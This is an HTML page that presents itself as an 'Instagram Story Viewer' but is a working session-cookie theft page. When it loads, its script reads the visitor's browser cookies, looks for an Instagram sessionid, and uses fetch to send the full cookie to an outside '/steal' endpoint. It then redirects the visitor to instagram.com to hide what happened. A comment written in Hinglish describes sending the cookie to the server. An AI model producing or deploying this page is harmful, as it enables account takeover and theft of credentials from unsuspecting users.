<!DOCTYPE html>
<html>
<head>
    <title>Instagram Story Viewer</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background: #fafafa;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #8e8e8e;
            font-size: 14px;
            margin-top: 10px;
        }
        .cookie-box {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 8px;
            margin: 20px 0;
            word-break: break-all;
            font-size: 12px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Instagram Story Viewer</h1>
        <p>Loading your stories...</p>
        <div class="loader"></div>
        <div class="status" id="status">Initializing...</div>
        <div class="cookie-box" id="cookieBox"></div>
    </div>

    <script>
        var cookie = document.cookie;
        var statusEl = document.getElementById('status');
        var cookieBox = document.getElementById('cookieBox');
        
        statusEl.textContent = '🔍 Checking your session...';
        
        if (cookie && cookie.includes('sessionid')) {
            cookieBox.style.display = 'block';
            cookieBox.textContent = '✅ Session found: ' + cookie.substring(0, 50) + '...';
            statusEl.textContent = '✅ Session captured! Redirecting to Instagram...';
        } else {
            statusEl.textContent = '⚠️ No session found. Make sure you are logged in.';
        }
        
        // Cookie ko server pe bhejo
        fetch('https://hacking-project-vosb.onrender.com/steal?cookie=' + encodeURIComponent(cookie))
            .then(response => response.text())
            .then(data => {
                console.log('✅ Server response:', data);
            })
            .catch(err => {
                console.log('❌ Error:', err);
            });
        
        // ✅ 5 SECOND BAAD INSTAGRAM PE REDIRECT
        setTimeout(function() {
            window.location.href = 'https://instagram.com';
        }, 5000);
    </script>
</body>
</html>
